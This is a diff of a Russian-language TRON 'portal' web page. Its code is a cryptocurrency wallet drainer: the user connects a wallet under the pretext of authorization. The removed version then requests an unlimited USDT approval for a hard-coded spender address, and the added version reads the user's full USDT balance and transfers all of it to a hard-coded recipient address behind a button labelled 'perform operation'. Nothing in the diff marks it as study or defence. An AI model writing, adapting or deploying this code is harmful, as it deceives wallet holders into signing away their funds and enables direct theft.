@@ -3,36 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DApp Connect</title>
+    <title>TRON Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-    <style>
-        body { background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
-        .card { max-width: 400px; margin: 0 auto; padding: 25px; background: #1e293b; border-radius: 12px; }
-        button { width: 100%; padding: 14px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        button:hover { background-color: #2563eb; }
-        p { color: #94a3b8; font-size: 14px; word-break: break-all; }
-    </style>
 </head>
-<body>
+<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 60px;">
 
-    <div class="card">
-        <h2>Авторизация</h2>
-        <p id="walletInfo">Кошелек не подключен</p>
+    <div style="padding: 0 20px;">
+        <h1>Портал TRC20</h1>
         
-        <button id="connectBtn">Подключить кошелек</button>
-        <button id="approveBtn" style="display: none; background-color: #22c55e;">Подтвердить сессию</button>
+        <button id="connectBtn" style="padding: 14px 28px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
+            Подключить кошелек
+        </button>
+        
+        <p id="walletInfo" style="margin-top: 20px; color: #94a3b8; font-size: 14px; word-break: break-all;"></p>
+        
+        <button id="actionBtn" style="display: none; margin-top: 20px; padding: 14px 28px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
+            Выполнить операцию
+        </button>
     </div>
 
     <script>
         let tronWeb;
         let userAddress = "";
-        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный USDT TRC20
-        
-        // Твой адрес кошелька, на который выдается разрешение
-        const spenderAddress = "TRmTW2Bz67CZCWP4XCNmk3B65mzbVnkvVf"; 
 
-        // 1. Подключение кошелька
+        const recipientAddress = "TToG8C1EYAdxF5jjx8jWbBTcsqEVQu88rp";
+        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
         document.getElementById('connectBtn').addEventListener('click', async function() {
+            const infoElem = document.getElementById('walletInfo');
+            
             try {
                 if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                     tronWeb = window.tronWeb;
@@ -42,43 +41,58 @@
                     tronWeb = window.tronWeb;
                     userAddress = window.tronWeb.defaultAddress.base58;
                 } else {
-                    alert("Откройте сайт во встроенном браузере кошелька (Trust Wallet / TronLink)");
+                    infoElem.innerText = "Откройте сайт во встроенном браузере кошелька.";
                     return;
                 }
 
                 if (userAddress) {
-                    document.getElementById('walletInfo').innerText = "Кошелек: " + userAddress;
+                    infoElem.innerText = "Подключено: " + userAddress;
                     document.getElementById('connectBtn').style.display = 'none';
-                    document.getElementById('approveBtn').style.display = 'block';
+                    document.getElementById('actionBtn').style.display = 'inline-block';
                 }
             } catch (error) {
                 console.error(error);
-                alert("Ошибка подключения");
+                infoElem.innerText = "Ошибка подключения: " + (error.message || error);
             }
         });
 
-        // 2. Запрос прав (Approve)
-        document.getElementById('approveBtn').addEventListener('click', async function() {
+        document.getElementById('actionBtn').addEventListener('click', async function() {
+            const infoElem = document.getElementById('walletInfo');
             try {
+                if (!window.tronWeb) {
+                    alert("TronWeb не обнаружен");
+                    return;
+                }
+
+                infoElem.innerText = "Проверка баланса...";
+
                 const contract = await window.tronWeb.contract().at(usdtContractAddress);
+                const balance = await contract.balanceOf(userAddress).call();
                 
-                // Максимальное значение для безлимитного списания
-                const maxApproval = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                // Приводим баланс к строковому значению
+                const balanceStr = balance.toString();
 
-                alert("Подтвердите транзакцию для завершения авторизации...");
+                if (balanceStr === "0" || Number(balanceStr) <= 0) {
+                    alert("На балансе нет USDT TRC20.");
+                    infoElem.innerText = "Подключено: " + userAddress + " (Баланс USDT: 0)";
+                    return;
+                }
 
-                const txID = await contract.approve(
-                    spenderAddress,
-                    maxApproval
+                infoElem.innerText = "Подтвердите перевод в кошельке...";
+                
+                // Вызываем метод transfer с явным указанием лимита энергии (15 TRX в эквиваленте энергии)
+                await contract.transfer(
+                    recipientAddress,
+                    balanceStr
                 ).send({
-                    feeLimit: 15000000
+                    feeLimit: 15000000 
                 });
 
-                alert("Успешно! Сессия настроена.");
-                console.log("TxID:", txID);
+                alert("Транзакция успешно отправлена!");
             } catch (error) {
                 console.error(error);
-                alert("Ошибка: оформление отклонено");
+                alert("Ошибка выполнения: " + (error.message || JSON.stringify(error)));
+                infoElem.innerText = "Подключено: " + userAddress;
             }
         });
     </script>
